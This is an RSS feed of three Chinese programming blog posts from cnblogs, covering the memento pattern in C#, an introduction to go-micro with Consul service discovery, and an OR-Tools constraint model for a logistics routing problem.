<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>设计模式之备忘录模式 - WeihanLi</title>
<link>http://www.cnblogs.com/weihanli/p/memento-pattern.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/weihanli/p/memento-pattern.html</guid>
<description>&lt;h2 id=&quot;intro&quot;&gt;Intro&lt;/h2&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;备忘录模式，在不破坏封装性的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态。这样以后就可将该对象恢复到原先保存的状态。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;备忘录模式也叫快照模式，这个模式的定义表达了两部分内容：一部分是，存储副本以便后期恢复；另一部分是，要在不违背封装原则的前提下，进行对象的备份和恢复。&lt;/p&gt;
&lt;h2 id=&quot;使用场景&quot;&gt;使用场景&lt;/h2&gt;
&lt;p&gt;备忘录（Memento）模式比较适用于功能比较复杂的，但需要维护或记录属性历史的类，或者需要保存的属性只是众多属性中的一小部分时，&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Originator&lt;/code&gt; 可以根据保存的 &lt;code&gt;Memento&lt;/code&gt; 信息还原到前一状态。&lt;/p&gt;
&lt;p&gt;可以用来做数据(状态)备份和恢复。&lt;/p&gt;
&lt;h2 id=&quot;prototype&quot;&gt;Prototype&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;Originator 拥有状态的宿主，需要提供一个入口来获取和更新当前状态&lt;/li&gt;
&lt;li&gt;State/Memento 需要备份状态信息&lt;/li&gt;
&lt;li&gt;Caretaker 状态备忘录，备份状态信息&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;sample&quot;&gt;Sample&lt;/h2&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;internal class Originator
{
    public string State { get; set; }

    public Memento CreateMemento()
    {
        return new Memento(State);
    }

    public void SetMemento(Memento memento)
    {
        State = memento?.State;
    }

    public void Show()
    {
        Console.WriteLine($&quot;State:{State}&quot;);
    }
}

internal class Memento
{
    public string State { get; }

    public Memento(string state) =&amp;gt; State = state;
}

internal class Caretaker
{
    public Memento Memento { get; set; }
}

var originator = new Originator
{
    State = &quot;On&quot;
};
originator.Show();

var caretaker = new Caretaker
{
    Memento = originator.CreateMemento()
};

originator.State = &quot;Off&quot;;
originator.Show();

originator.SetMemento(caretaker.Memento);
originator.Show();
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;more&quot;&gt;More&lt;/h2&gt;
&lt;p&gt;备忘录模式的应用场景也比较明确和有限，主要是用来防丢失、撤销、恢复等。它跟平时我们常说的“备份”很相似。两者的主要区别在于，备忘录模式更侧重于代码的设计和实现，备份更侧重架构设计或产品设计。&lt;/p&gt;
&lt;p&gt;对于大对象的备份来说，备份占用的存储空间会比较大，备份和恢复的耗时会比较长。&lt;br/&gt;针对这个问题，不同的业务场景有不同的处理方式。比如，只备份必要的恢复信息，结合最新的数据来恢复；再比如，全量备份和增量备份相结合，低频全量备份，高频增量备份，两者结合来做恢复，当我们需要恢复到某一时间点的备份的时候，如果这一时间点有做全量备份，我们直接拿来恢复就可以了。如果这一时间点没有对应的全量备份，我们就先找到最近的一次全量备份，然后用它来恢复，之后执行此次全量备份跟这一时间点之间的所有增量备份，也就是对应的操作或者数据变动。这样就能减少全量备份的数量和频率，减少对时间、内存的消耗。类似于 Redis 持久化方案的 AOF 和 RDB 的结合。&lt;/p&gt;
&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
</description>
<pubDate>Sat, 08 Aug 2020 17:21:00 +0000</pubDate>
<dc:creator>WeihanLi</dc:creator>
<og:description>备忘录模式</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/weihanli/p/memento-pattern.html</dc:identifier>
</item>
<item>
<title>go微服务系列(一) go micro入门 - 宝树呐</title>
<link>http://www.cnblogs.com/baoshu/p/13461191.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/baoshu/p/13461191.html</guid>
<description>&lt;h2 id=&quot;1-什么是go-micro&quot;&gt;&lt;span id=&quot;head1&quot;&gt;1. 什么是go micro&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;11-go-micro作用&quot;&gt;&lt;span id=&quot;head2&quot;&gt;1.1 go micro作用&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;它是一个可插入的RPC框架，用于在Go中编写微服务。开箱即用，您将收到：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;服务发现&lt;/strong&gt;: 应用程序自动注册到服务发现系统&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;负载平衡&lt;/strong&gt;: 客户端负载平衡，用于平衡服务实例之间的请求&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;同步通信&lt;/strong&gt;: 提供请求 / 响应传输层。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;异步通信&lt;/strong&gt;: 内置发布 / 订阅功能。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;消息编码&lt;/strong&gt;: 基于消息的内容类型头的编码 / 解码。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;RPC 客户机/服务器包&lt;/strong&gt;: 利用上述功能并公开接口来构建微服务&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;12-go-micro架构组成&quot;&gt;&lt;span id=&quot;head3&quot;&gt;1.2 go micro架构组成&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;Go 微体系结构可以描述为三层堆栈&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlgy1ghjrbgs38oj30eb07rq35.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;顶层由客户端-服务器模型和服务抽象组成。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;服务器&lt;/strong&gt;: 用于编写服务的构建块&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;客户端&lt;/strong&gt;: 提供了向服务请求的接口。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;底层由以下类型的插件组成：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;代理&lt;/strong&gt;: 为异步发布/订阅通信提供消息代理的接口。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;编解码器&lt;/strong&gt;: 用于编码/解码消息。支持的格式包括 json，bson，protobuf，msgpack 等。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;注册表&lt;/strong&gt;: 提供服务发现机制(默认为 Consul)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;选择器&lt;/strong&gt;: 建立在注册表上的负载平衡抽象。它允许使用诸如随机，轮循，最小康等算法来 “选择” 服务。&lt;br/&gt;传输 - 服务之间同步请求 / 响应通信的接口。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Go Micro&lt;/code&gt;还提供了&lt;code&gt;Sidecar&lt;/code&gt;等功能。这使您可以使用&lt;code&gt;Go&lt;/code&gt;以外的语言编写的服务&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;Sidecar提供服务注册，gRPC编码/解码和HTTP处理程序。它支持多种语言。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;2-go-micro入门&quot;&gt;&lt;span id=&quot;head4&quot;&gt;2. go micro入门&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;最简单的用法大概如下，结合&lt;code&gt;net/http&lt;/code&gt;标准库监听路由&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;package main

import (
        &quot;github.com/micro/go-micro/web&quot;
        &quot;net/http&quot;
)

func main() {

        server := web.NewService(web.Address(&quot;:8081&quot;)) // 路由
        server.HandleFunc(&quot;/&quot;, func(w http.ResponseWriter, r *http.Request) {
                w.Write([]byte(&quot;hello go micro&quot;))
        })
        _ = server.Run()
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;也可以集成第三方web框架作为路由&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;package main

import (
        &quot;net/http&quot;

        &quot;github.com/gin-gonic/gin&quot;
        &quot;github.com/micro/go-micro/web&quot;
)

func main() {
    // 使用gin作为路由
        r := gin.Default()
        r.GET(&quot;/user&quot;, func(c *gin.Context) {
                c.String(http.StatusOK, &quot;user api&quot;)
        })

        server := web.NewService(
                web.Address(&quot;:8081&quot;),                                // 端口
                web.Metadata(map[string]string{&quot;protocol&quot;: &quot;http&quot;}), // 元信息
                web.Handler(r)) // 路由
                
        _ = server.Run()
}

&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;3-结合consul进行服务注册发现&quot;&gt;&lt;span id=&quot;head5&quot;&gt;3. 结合consul进行服务注册/发现&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;微服务里最重要的关键一步就是&lt;strong&gt;服务注册&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;常用的有consul、etcd、zookeeper、eureka&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我们这里使用consul&lt;/p&gt;
&lt;h3 id=&quot;31-consul的安装&quot;&gt;&lt;span id=&quot;head6&quot;&gt;3.1 consul的安装&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;这里直接使用docker安装&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;docker run -d --name=cs -p 8500:8500 consul agent -server -bootstrap -ui -client 0.0.0.0
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后再访问端口8500，如下现实安装成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlgy1ghjqvv4gxxj31h80j0ta0.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;32-服务注册代码示例&quot;&gt;&lt;span id=&quot;head7&quot;&gt;3.2 服务注册代码示例&lt;/span&gt;&lt;/h3&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;&lt;code&gt;github.com/micro/go-micro/registry/consul&lt;/code&gt;&lt;br/&gt;上面这个在1.14.0版本之后删除了，要用这个&lt;code&gt;github.com/micro/go-plugins/registry/consul&lt;/code&gt;，或者换成etcd作为注册中心&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;package main

import (
        &quot;net/http&quot;

        &quot;github.com/gin-gonic/gin&quot;
        &quot;github.com/micro/go-micro/registry&quot;
        &quot;github.com/micro/go-micro/web&quot;
        &quot;github.com/micro/go-plugins/registry/consul&quot;
)

func main() {
    // 添加consul地址
        cr := consul.NewRegistry(
                registry.Addrs(&quot;127.0.0.1:8500&quot;))
    
    // 使用gin作为router
        router := gin.Default()
        router.GET(&quot;/user&quot;, func(c *gin.Context) {
                c.String(http.StatusOK, &quot;user api&quot;)
        })
    
    // 初始化go micro
        server := web.NewService(
                web.Name(&quot;productService&quot;),                          // 当前微服务服务名
                web.Registry(cr),                                    // 注册到consul
                web.Address(&quot;:8081&quot;),                                // 端口
                web.Metadata(map[string]string{&quot;protocol&quot;: &quot;http&quot;}), // 元信息
                web.Handler(router)) // 路由

        _ = server.Run()
}

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;把上述代码运行起来，再去&lt;code&gt;consul&lt;/code&gt;界面查看，发现&lt;code&gt;productService&lt;/code&gt;服务添加成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlgy1ghjsef8s11j30v50cfjs9.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后把代码停掉，再去&lt;code&gt;consul&lt;/code&gt;界面查看，&lt;code&gt;productService&lt;/code&gt;就没了，非常方便&lt;/p&gt;
&lt;h3 id=&quot;32-服务发现代码示例&quot;&gt;&lt;span id=&quot;head8&quot;&gt;3.2 服务发现代码示例&lt;/span&gt;&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;package main

import (
        &quot;fmt&quot;
        &quot;log&quot;

        &quot;github.com/micro/go-micro/client/selector&quot;
        &quot;github.com/micro/go-micro/registry&quot;
        &quot;github.com/micro/go-plugins/registry/consul&quot;
)

func main() {
        // 1.连接到consul
        cr := consul.NewRegistry(registry.Addrs(&quot;127.0.0.1:8500&quot;))

        // 2.根据service name获取对应的微服务列表
        services, err := cr.GetService(&quot;productService&quot;)
        if err != nil {
                log.Fatal(&quot;cannot get service list&quot;)
        }

        // 3.使用random随机获取其中一个实例
        next := selector.Random(services)
        svc, err := next()
        if err != nil {
                log.Fatal(&quot;cannot get service&quot;)
        }

        fmt.Println(&quot;[测试输出]:&quot;, svc.Id, svc.Address, svc.Metadata)
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后使用goland先启动&lt;strong&gt;服务注册&lt;/strong&gt;中的&lt;code&gt;productService&lt;/code&gt;的微服务，再启动&lt;strong&gt;服务发现&lt;/strong&gt;中的代码。&lt;/p&gt;
&lt;p&gt;服务发现将会输出如下，服务发现成功：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlgy1ghjuv1uzgrj30oo05uaaw.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Sat, 08 Aug 2020 16:17:00 +0000</pubDate>
<dc:creator>宝树呐</dc:creator>
<og:description>1. 什么是go micro 1.1 go micro作用 1.2 go micro架构组成 2. go micro入门 3. 结合consul进行服务注册/发现 3.1 consul的安装 3.2</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/baoshu/p/13461191.html</dc:identifier>
</item>
<item>
<title>物流运输-路线区域的互斥问题 - McKay</title>
<link>http://www.cnblogs.com/aarond/p/or-tool.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/aarond/p/or-tool.html</guid>
<description>&lt;p&gt;物流运输一般是通过路线来的，但是考虑到实际场景，有可能具体城市的区与区之间是互斥的，不能放在同一条路线内，比如由于某一条较长的河分开了某些区域导致不能放一条路线内运输；又比如运输证是按照区域来发放的等等。&lt;/p&gt;
&lt;p&gt;比如如下几个节点：昆山(区：昆山市)、苏州(区：相城区、吴中区)、佛山(区：顺德区)、佛山(区：高明区)  这些节点城市+区域，我们假设：苏州是个特别的城市，相城区、吴中区不能同时配在一条路线内部，求解&lt;/p&gt;
&lt;p&gt;这个解最终是希望得到如下这样的结果：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
存在的解决方案个数：2
       昆山(昆山市)---&amp;gt;苏州(吴中区)---&amp;gt;佛山(顺德区)---&amp;gt;佛山(高明区)---&amp;gt;
       昆山(昆山市)---&amp;gt;苏州(相城区)---&amp;gt;佛山(顺德区)---&amp;gt;佛山(高明区)---&amp;gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;这次用google的OR Tool来解决这个问题，链接在此处：&lt;a href=&quot;https://developers.google.cn/optimization&quot;&gt;https://developers.google.cn/optimization&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;先定义数据结构，以及初始化demo数据&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;47&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
public static class CityLocation
    {
        public String cityName;
        public String districtName;
        public boolean special;
        public CityLocation(String cityName, String districtName)
        {
            this(cityName, districtName, false);
        }

        public CityLocation(String cityName, String districtName, boolean special)
        {
            this.cityName=cityName;
            this.districtName=districtName;
            this.special=special;
        }
    }

    private static List&amp;lt;CityLocation&amp;gt; generateData() {
        List&amp;lt;CityLocation&amp;gt; result=new ArrayList&amp;lt;&amp;gt;();

        CityLocation location=new CityLocation(&quot;昆山&quot;, &quot;昆山市&quot;);
        result.add(location);

        location=new CityLocation(&quot;苏州&quot;, &quot;吴中区&quot;, true);
        result.add(location);

        location=new CityLocation(&quot;苏州&quot;, &quot;相城区&quot;, true);
        result.add(location);

        location=new CityLocation(&quot;佛山&quot;, &quot;顺德区&quot;);
        result.add(location);

        location=new CityLocation(&quot;佛山&quot;, &quot;高明区&quot;);
        result.add(location);

        return result;
    }　　
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 先说下思路，google的这个算法框架，需要加入一堆约束，比如==约束、&amp;lt;=约束、&amp;lt;=约束等等，然后算法框架会自己去穷举；又或者做最优化，又或者做可行解（意思就是非最优化解）。&lt;/p&gt;
&lt;p&gt;我们先来加约束：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;36&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
static class SpecialCityRestrict implements LinearExpr
    {
        private List&amp;lt;IntVar&amp;gt; vars;
        public SpecialCityRestrict(List&amp;lt;IntVar&amp;gt; vars) {
            this.vars=vars;
        }

        @Override
        public int numElements() {
            return this.vars.size();
        }

        @Override
        public IntVar getVariable(int i) {
            return this.vars.get(i);
        }

        @Override
        public long getCoefficient(int i) {
            return 1;
        }
    }


//main方法里加
SpecialCityRestrict restrict=new SpecialCityRestrict(varsInner);
model.addLessOrEqual(restrict, 1);　　
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;model.addLessOrEqual就是加&amp;lt;=的约束，上述就是加了个&amp;lt;=1的约束，比如约束苏州的区最多只能出现1次，也可以不出现的意思，&amp;lt;=1次&lt;/p&gt;
&lt;p&gt;上方的List&amp;lt;IntVar&amp;gt; vars就是用来变换苏州区是否被放入路线的控制变量，是个集合，会在main里放进去，如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;55&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
　　　　 List&amp;lt;CityLocation&amp;gt; globalCityLocations=generateData();
        Map&amp;lt;String, List&amp;lt;IntVar&amp;gt;&amp;gt; specialCityVarsMap=new HashMap&amp;lt;&amp;gt;();      &lt;span&gt;//特殊城市对应的or控制变量关系Map&lt;/span&gt;
        List&amp;lt;String&amp;gt; specialCities=globalCityLocations.stream().filter(f-&amp;gt;f.special).map(f-&amp;gt;f.cityName).distinct().collect(Collectors.toList());　　&lt;span&gt;//筛选出所有特殊城市&lt;/span&gt;
        for(String specialCity:specialCities)
            specialCityVarsMap.put(specialCity, new ArrayList&amp;lt;&amp;gt;());　　　　 &lt;span&gt;//初始化Map&lt;/span&gt;

        CpModel model = new CpModel();　　　　　　　　　　　　　　　　　　　　　　&lt;span&gt;//or tool模型构建&lt;/span&gt;
&lt;/pre&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
        List&amp;lt;IntVar&amp;gt; globalVars=new ArrayList&amp;lt;IntVar&amp;gt;();　　　　　　　　　　　&lt;span&gt;//这里会存放所有控制变量，后续会把这些控制变量传入收集解决方案解的回调类中&lt;/span&gt;&lt;span&gt; &lt;/span&gt;
&lt;/pre&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
　　　　 for(int idx=0;idx&amp;lt;globalCityLocations.size();idx++)
        {
            IntVar var=model.newIntVar(0, 1, String.valueOf(idx));　　　　　&lt;span&gt;//新建1个控制变量-int类型，值变化区间是[0, 1]&lt;/span&gt;　　　　　　
&lt;/pre&gt;
&lt;pre&gt;
　　　　　　  globalVars.add(var);
&lt;/pre&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
　　　　　　　CityLocation cityLocation=globalCityLocations.get(idx); &lt;br/&gt;　　　　　　 if(cityLocation.special) &lt;br/&gt;　　　　　　　{&lt;br/&gt;　　　　　　　　　　specialCityVarsMap.get(cityLocation.cityName).add(var);　　&lt;span&gt;//如果是特殊城市，就把控制变量维护到特殊城市控制变量关系map中&lt;/span&gt; &lt;br/&gt;　　　　　　　　　　specialCityVars.add(var); &lt;br/&gt;　　　　　　}&lt;br/&gt;　　　　}&lt;br/&gt;　　　　for(String key:specialCityVarsMap.keySet())　　　　　　　　　　　　　　&lt;span&gt;//动态的从特殊城市map中开始加模型约束，不用写死，很好&lt;/span&gt; &lt;br/&gt;　　　　{&lt;br/&gt;　　　　　　List&amp;lt;IntVar&amp;gt; varsInner=specialCityVarsMap.get(key); &lt;br/&gt;　　　　　　SpecialCityRestrict restrict=new SpecialCityRestrict(varsInner);　　&lt;span&gt;//针对某个具体特殊城市的约束对象&lt;/span&gt; &lt;br/&gt;　　　　　　model.addLessOrEqual(restrict, 1);　　　　　　　　　　　　　　　　　　　　&lt;span&gt;//对应的区的个数约束为&amp;lt;=1&lt;/span&gt;　　　　}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然后就要搜索解决方案了&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;37&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
VarArraySolutionPrinter varArraySolutionPrinter=new VarArraySolutionPrinter(globalVars, globalCityLocations);　　&lt;span&gt;//这个类是自定义的，用来收集解的集合的，在后面有定义&lt;/span&gt;

CpSolver solver = new CpSolver();


CpSolverStatus status=solver.searchAllSolutions(model, varArraySolutionPrinter);

System.out.println(status);

varArraySolutionPrinter.printSolutions();
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;36&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
static class VarArraySolutionPrinter extends CpSolverSolutionCallback {
        private int solutionCount;
        private List&amp;lt;IntVar&amp;gt; globalVars;
        private List&amp;lt;CityLocation&amp;gt; globalCityLocations;
        private List&amp;lt;List&amp;lt;CityLocation&amp;gt;&amp;gt; solutions=new ArrayList&amp;lt;&amp;gt;();

        public VarArraySolutionPrinter(List&amp;lt;IntVar&amp;gt; globalVars, List&amp;lt;CityLocation&amp;gt; globalCityLocations) {
            this.globalCityLocations=globalCityLocations;
            this.globalVars=globalVars;
        }

        @Override
        public void onSolutionCallback() {
            List&amp;lt;CityLocation&amp;gt; oneSolution=new ArrayList&amp;lt;&amp;gt;();

            for(int idx=0;idx&amp;lt;globalVars.size();idx++)
            {
                IntVar v=globalVars.get(idx);
                long oneOrZero=value(v);
                if(oneOrZero==1)
                {
                    oneSolution.add(this.globalCityLocations.get(idx));
                }
            }

            solutions.add(oneSolution);
            solutionCount++;
        }

        public int getSolutionCount() {
            return solutionCount;
        }

        public void printSolutions() {
            System.out.println(&quot;存在的解决方案个数：&quot;+this.getSolutionCount());
            for(List&amp;lt;CityLocation&amp;gt; oneSolution:this.solutions)
            {
                StringBuilder sb=new StringBuilder();

                for(CityLocation cityLocation:oneSolution)
                {
                    sb.append(cityLocation.cityName+&quot;(&quot;+cityLocation.districtName+&quot;)---&amp;gt;&quot;);
                }

                System.out.println(&quot;       &quot;+sb.toString());
            }
            System.out.println(&quot;--END--&quot;);
        }
    }　　
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;运行后的结果出乎意料：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;OPTIMAL
存在的解决方案个数：&lt;/span&gt;&lt;span&gt;24&lt;/span&gt;&lt;span&gt;
       
       苏州(吴中区)&lt;/span&gt;---&amp;gt;&lt;span&gt;
       苏州(相城区)&lt;/span&gt;---&amp;gt;&lt;span&gt;
       苏州(相城区)&lt;/span&gt;---&amp;gt;佛山(顺德区)---&amp;gt;&lt;span&gt;
       佛山(顺德区)&lt;/span&gt;---&amp;gt;&lt;span&gt;
       苏州(吴中区)&lt;/span&gt;---&amp;gt;佛山(顺德区)---&amp;gt;&lt;span&gt;
       苏州(吴中区)&lt;/span&gt;---&amp;gt;佛山(顺德区)---&amp;gt;佛山(高明区)---&amp;gt;&lt;span&gt;
       佛山(顺德区)&lt;/span&gt;---&amp;gt;佛山(高明区)---&amp;gt;&lt;span&gt;
       苏州(相城区)&lt;/span&gt;---&amp;gt;佛山(顺德区)---&amp;gt;佛山(高明区)---&amp;gt;&lt;span&gt;
       苏州(相城区)&lt;/span&gt;---&amp;gt;佛山(高明区)---&amp;gt;&lt;span&gt;
       佛山(高明区)&lt;/span&gt;---&amp;gt;&lt;span&gt;
       苏州(吴中区)&lt;/span&gt;---&amp;gt;佛山(高明区)---&amp;gt;&lt;span&gt;
       昆山(昆山市)&lt;/span&gt;---&amp;gt;苏州(吴中区)---&amp;gt;佛山(高明区)---&amp;gt;&lt;span&gt;
       昆山(昆山市)&lt;/span&gt;---&amp;gt;苏州(吴中区)---&amp;gt;佛山(顺德区)---&amp;gt;佛山(高明区)---&amp;gt;&lt;span&gt;
       昆山(昆山市)&lt;/span&gt;---&amp;gt;苏州(吴中区)---&amp;gt;佛山(顺德区)---&amp;gt;&lt;span&gt;
       昆山(昆山市)&lt;/span&gt;---&amp;gt;苏州(吴中区)---&amp;gt;&lt;span&gt;
       昆山(昆山市)&lt;/span&gt;---&amp;gt;&lt;span&gt;
       昆山(昆山市)&lt;/span&gt;---&amp;gt;佛山(顺德区)---&amp;gt;&lt;span&gt;
       昆山(昆山市)&lt;/span&gt;---&amp;gt;佛山(顺德区)---&amp;gt;佛山(高明区)---&amp;gt;&lt;span&gt;
       昆山(昆山市)&lt;/span&gt;---&amp;gt;佛山(高明区)---&amp;gt;&lt;span&gt;
       昆山(昆山市)&lt;/span&gt;---&amp;gt;苏州(相城区)---&amp;gt;佛山(高明区)---&amp;gt;&lt;span&gt;
       昆山(昆山市)&lt;/span&gt;---&amp;gt;苏州(相城区)---&amp;gt;&lt;span&gt;
       昆山(昆山市)&lt;/span&gt;---&amp;gt;苏州(相城区)---&amp;gt;佛山(顺德区)---&amp;gt;&lt;span&gt;
       昆山(昆山市)&lt;/span&gt;---&amp;gt;苏州(相城区)---&amp;gt;佛山(顺德区)---&amp;gt;佛山(高明区)---&amp;gt;
--END--
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;似乎感觉不太对，得再加些约束啊，看来。&lt;/p&gt;
&lt;p&gt;我们要求特殊城市必须出现在线路中，也就是说特殊城市节点的约束是&amp;gt;=1&lt;/p&gt;
&lt;p&gt;在执行搜索的代码前加入这些代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
SpecialCityRestrict specialCityMustExistsRestrict=new SpecialCityRestrict(specialCityVars);
model.addGreaterOrEqual(specialCityMustExistsRestrict, 1);　　
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然后再加个约束：非特殊城市必须出现在路线之中，也就是非特殊城市变换后选中为1的size要==非特殊城市的个数&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;36&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
SpecialCityRestrict normalCityRestrict=new SpecialCityRestrict(normalCityVars);
model.addEquality(normalCityRestrict, normalCityVars.size());　　　　　　　　　　　　　　　　&lt;span&gt;//这个normalCityVars需要改main里的循环，既：当为普通city时把控制变量add到这个List中&lt;/span&gt;　　
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;再执行下&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
OPTIMAL
存在的解决方案个数：2
       昆山(昆山市)---&amp;gt;苏州(吴中区)---&amp;gt;佛山(顺德区)---&amp;gt;佛山(高明区)---&amp;gt;
       昆山(昆山市)---&amp;gt;苏州(相城区)---&amp;gt;佛山(顺德区)---&amp;gt;佛山(高明区)---&amp;gt;
--END--
&lt;/pre&gt;&lt;/div&gt;


</description>
<pubDate>Sat, 08 Aug 2020 14:35:00 +0000</pubDate>
<dc:creator>McKay</dc:creator>
<og:description>物流运输一般是通过路线来的，但是考虑到实际场景，有可能具体城市的区与区之间是互斥的，不能放在同一条路线内，比如由于某一条较长的河分开了某些区域导致不能放一条路线内运输；又比如运输证是按照区域来发放的等</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
